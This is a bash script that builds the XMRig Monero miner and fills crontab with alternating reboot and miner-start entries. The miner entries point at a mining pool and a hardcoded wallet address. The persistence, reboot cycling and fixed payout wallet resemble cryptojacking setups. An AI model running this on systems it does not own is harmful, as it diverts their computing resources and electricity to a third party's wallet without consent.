#!/bin/bash

sudo apt -y install cron
sudo systemctl enable cron
sudo apt-get -y install screen
sudo apt -y install software-properties-common
sudo apt -y update
sudo apt -y upgrade
sudo apt-get -y install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
sudo git clone https://github.com/xmrig/xmrig.git
sudo mkdir xmrig/build && cd xmrig/build
sudo cmake ..
sudo make -j$(nproc)
(crontab -l 2>/dev/null; echo "15 1 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "25 1 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "50 1 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "1 2 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "25 2 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "35 2 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "1 3 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "10 3 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "35 3 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "45 3 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "10 4 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "20 4 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "45 4 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "55 4 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "20 5 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "30 5 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "55 5 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "5 6 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "30 6 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "40 6 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 7 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 7 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "45 7 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "55 7 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "20 8 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "30 8 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "55 8 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "5 9 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "30 9 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "40 9 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 10 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 10 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "40 10 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "50 10 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "15 11 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "25 11 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "50 11 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "5 12 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "30 12 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "40 12 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 13 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 13 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "40 13 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "50 13 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "15 14 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "25 14 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "50 14 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "5 15 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "30 15 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "40 15 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 16 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 16 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "40 16 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "50 16 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "10 17 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "20 17 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "45 17 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "55 17 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 18 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 18 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "45 18 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "55 18 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "20 19 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "30 19 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "55 19 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "5 20 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "30 20 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "40 20 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "5 21 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 21 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "45 21 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "55 21 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "20 22 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "30 22 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "55 22 * * * /usr/sbin/reboot") | crontab -
(crontab -l 2>/dev/null; echo "15 23 * * * xmrig/build/xmrig -B -o de.minexmr.com:443 -u 42369sUqLJcaTz7KwxpY7197pX9TAomf4UBPt38XYto6TaybwEAaNdTiLoAfrETSLnX2bcbxrM7TeXUXURABgKwLK2YsS28 -k --tls --rig-id Scripty") | crontab -
(crontab -l 2>/dev/null; echo "40 23 * * * /usr/sbin/reboot") | crontab -
